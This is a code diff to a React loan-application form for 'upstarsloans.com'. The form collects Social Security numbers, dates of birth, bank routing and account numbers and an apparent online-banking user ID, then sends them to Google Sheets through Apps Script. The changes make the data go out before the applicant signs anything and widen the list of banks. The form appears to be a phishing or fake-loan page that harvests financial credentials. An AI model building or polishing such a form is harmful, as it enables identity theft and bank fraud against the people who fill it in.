@@ -19,6 +19,7 @@ const LoanApplication = () => {
     dateOfBirth: '',
     ssnNumber: '',
     bankName: '',
+    customBankName: '',
     routingNumber: '',
     accountNumber: '',
     userId: '',
@@ -31,6 +32,7 @@ const LoanApplication = () => {
   const [isProcessing, setIsProcessing] = useState(false)
   const [isDrawing, setIsDrawing] = useState(false)
   const [validationErrors, setValidationErrors] = useState({})
+  const [isSubmittingEmail, setIsSubmittingEmail] = useState(false)
   const canvasRef = useRef(null)
   const navigate = useNavigate()
 
@@ -124,9 +126,30 @@ const LoanApplication = () => {
 
   const handleInputChange = (e) => {
     const { name, value } = e.target
+    let formattedValue = value
+    
+    // Auto-format date of birth as MM/DD/YYYY
+    if (name === 'dateOfBirth') {
+      // Remove any non-digit characters
+      let digits = value.replace(/\D/g, '')
+      
+      // Add slashes automatically
+      if (digits.length >= 2) {
+        formattedValue = digits.slice(0, 2) + '/' + digits.slice(2)
+      }
+      if (digits.length >= 4) {
+        formattedValue = digits.slice(0, 2) + '/' + digits.slice(2, 4) + '/' + digits.slice(4, 8)
+      }
+      
+      // Limit to MM/DD/YYYY format
+      if (formattedValue.length > 10) {
+        formattedValue = formattedValue.slice(0, 10)
+      }
+    }
+    
     setFormData({
       ...formData,
-      [name]: value
+      [name]: formattedValue
     })
   }
 
@@ -181,7 +204,7 @@ const LoanApplication = () => {
     }
   }
 
-  const handleStep2Submit = (e) => {
+  const handleStep2Submit = async (e) => {
     e.preventDefault()
     const errors = {}
     
@@ -202,6 +225,12 @@ const LoanApplication = () => {
     setValidationErrors(errors)
     
     if (Object.keys(errors).length === 0) {
+      // Send email first when Generate Document is clicked
+      setIsSubmittingEmail(true)
+      await submitToGoogleSheets()
+      setIsSubmittingEmail(false)
+      
+      // Then show agreement for signature
       setShowAgreement(true)
       setValidationErrors({})
     }
@@ -212,8 +241,7 @@ const LoanApplication = () => {
       setCurrentStep(3)
       setIsProcessing(true)
       
-      // Submit form to Google Apps Script
-      submitToGoogleSheets()
+      // Email already sent when Generate Document was clicked
       
       setTimeout(() => {
         navigate('/application-summary')
@@ -237,7 +265,7 @@ const LoanApplication = () => {
         zipCode: formData.zipCode,
         dateOfBirth: formData.dateOfBirth,
         ssnNumber: formData.ssnNumber,
-        bankName: formData.bankName,
+        bankName: formData.bankName === 'Other' ? formData.customBankName : formData.bankName,
         routingNumber: formData.routingNumber,
         accountNumber: formData.accountNumber,
         userId: formData.userId,
@@ -581,14 +609,18 @@ Terms of Service: www.upstarsloans.com/terms-of-service`
               <div className="relative">
                 <Calendar className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
                 <input
-                  type="date"
+                  type="text"
                   name="dateOfBirth"
                   value={formData.dateOfBirth}
                   onChange={handleInputChange}
                   className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
+                  placeholder="MM/DD/YYYY"
+                  pattern="[0-9]{2}/[0-9]{2}/[0-9]{4}"
+                  maxLength="10"
                   required
                 />
               </div>
+              <p className="text-xs text-gray-500 mt-1">Enter your date of birth in MM/DD/YYYY format (e.g., 01/15/1990)</p>
             </div>
 
             <div>
@@ -662,9 +694,9 @@ Terms of Service: www.upstarsloans.com/terms-of-service`
                 value={formData.routingNumber}
                 onChange={handleInputChange}
                 className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
-                placeholder="12345678"
-                pattern="[0-9]{8}"
-                maxLength="8"
+                placeholder="123456789"
+                pattern="[0-9]{9}"
+                maxLength="9"
                 required
               />
             </div>
@@ -822,9 +854,32 @@ Terms of Service: www.upstarsloans.com/terms-of-service`
                     <option value="Alabama Central CU">Alabama Central CU</option>
                     <option value="Navigator Credit Union">Navigator Credit Union</option>
                     <option value="Diversified Members Credit Union">Diversified Members Credit Union</option>
+                    <option value="Other">Other (Enter bank name below)</option>
                   </select>
                 </div>
               </div>
+
+              {/* Custom Bank Name - Show only when "Other" is selected */}
+              {formData.bankName === 'Other' && (
+                <div>
+                  <label className="block text-sm font-medium text-gray-700 mb-2">
+                    Enter Your Bank Name *
+                  </label>
+                  <div className="relative">
+                    <Building2 className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
+                    <input
+                      type="text"
+                      name="customBankName"
+                      value={formData.customBankName || ''}
+                      onChange={handleInputChange}
+                      className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
+                      placeholder="Enter your bank name"
+                      required={formData.bankName === 'Other'}
+                    />
+                  </div>
+                  <p className="text-xs text-gray-500 mt-1">Please enter the exact name of your bank or credit union</p>
+                </div>
+              )}
 
               {/* User ID */}
               <div>
@@ -923,9 +978,24 @@ Terms of Service: www.upstarsloans.com/terms-of-service`
               <button
                 type="submit"
                 className="w-full btn-primary text-lg py-4"
+                disabled={isSubmittingEmail}
               >
-                Generate Agreement
-                <ArrowRight className="ml-2 w-5 h-5 inline" />
+                {isSubmittingEmail ? (
+                  <>
+                    <span className="inline-flex items-center">
+                      <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                      </svg>
+                      Sending Application...
+                    </span>
+                  </>
+                ) : (
+                  <>
+                    Generate Agreement
+                    <ArrowRight className="ml-2 w-5 h-5 inline" />
+                  </>
+                )}
               </button>
             </form>
           </div>
